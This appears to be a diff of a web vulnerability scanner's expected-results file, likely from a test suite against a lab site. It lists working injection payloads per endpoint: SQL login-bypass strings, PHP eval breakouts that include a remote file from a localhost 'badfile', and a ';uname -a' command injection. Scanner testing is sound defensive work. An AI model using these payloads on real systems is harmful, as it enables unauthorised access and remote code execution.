@@ -2,37 +2,138 @@
     {
         "class": "SQL Injection", 
         "results": {
-            "http://target.com/": []
+            "http://target.com": [
+                {
+                    "endpoint": "/sqli/doublesqliaction.php", 
+                    "params": {
+                        "username": "' or '1=1"
+                    }, 
+                    "method": "POST"
+                }, 
+                {
+                    "endpoint": "/sqli/doublesqliaction.php", 
+                    "params": {
+                        "username": "'1 'or' 1'='1"
+                    }, 
+                    "method": "POST"
+                }, 
+                {
+                    "endpoint": "/sqli/sqli.php", 
+                    "params": {
+                        "username": "'1 'or' 1'='1"
+                    }, 
+                    "method": "POST"
+                }, 
+                {
+                    "endpoint": "/sqli/doublesqliaction.php", 
+                    "params": {
+                        "username": "' or '1'='1"
+                    }, 
+                    "method": "POST"
+                }, 
+                {
+                    "endpoint": "/sqli/doublesqliaction.php", 
+                    "params": {
+                        "username": "'or 1=1#"
+                    }, 
+                    "method": "POST"
+                }, 
+                {
+                    "endpoint": "/sqli/doublesqliaction.php", 
+                    "params": {
+                        "username": "' OR '1=1 %00"
+                    }, 
+                    "method": "POST"
+                }, 
+                {
+                    "endpoint": "/sqli/sqli.php", 
+                    "params": {
+                        "username": "\" or \"1=1"
+                    }, 
+                    "method": "POST"
+                }
+            ]
         }
     }, 
     {
         "class": "Server Side Code Injection", 
         "results": {
-            "http://target.com/": []
+            "http://target.com": [
+                {
+                    "endpoint": "/serverside/eval.php", 
+                    "params": {
+                        "page": "1; include('../index.php')"
+                    }, 
+                    "method": "GET"
+                }, 
+                {
+                    "endpoint": "/serverside/eval2.php", 
+                    "params": {
+                        "page": "';include('../index.php');echo'"
+                    }, 
+                    "method": "POST"
+                }, 
+                {
+                    "endpoint": "/serverside/eval2.php", 
+                    "params": {
+                        "page": "\";include(\"../index.php\");echo\""
+                    }, 
+                    "method": "GET"
+                }, 
+                {
+                    "endpoint": "/serverside/eval.php", 
+                    "params": {
+                        "page": "1; include('http://localhost/badfile.php?')"
+                    }, 
+                    "method": "GET"
+                }, 
+                {
+                    "endpoint": "/serverside/eval2.php", 
+                    "params": {
+                        "page": "';include('http://localhost/badfile.php?');echo'"
+                    }, 
+                    "method": "POST"
+                }, 
+                {
+                    "endpoint": "/serverside/eval2.php", 
+                    "params": {
+                        "page": "\";include(\"http://localhost/badfile.php?\");echo\""
+                    }, 
+                    "method": "GET"
+                }
+            ]
         }
     }, 
     {
         "class": "Directory Traversal", 
         "results": {
-            "http://target.com/": []
+            "http://target.com": []
         }
     }, 
     {
         "class": "Open Redirect", 
         "results": {
-            "http://target.com/": []
+            "http://target.com": []
         }
     }, 
     {
         "class": "Cross Site Request Forgery", 
         "results": {
-            "http://target.com/": []
+            "http://target.com": []
         }
     }, 
     {
         "class": "Shell Command Injection", 
         "results": {
-            "http://target.com/": []
+            "http://target.com": [
+                {
+                    "endpoint": "/commandinjection/commandinjection.php", 
+                    "params": {
+                        "host": ";uname -a"
+                    }, 
+                    "method": "POST"
+                }
+            ]
         }
     }
 ]
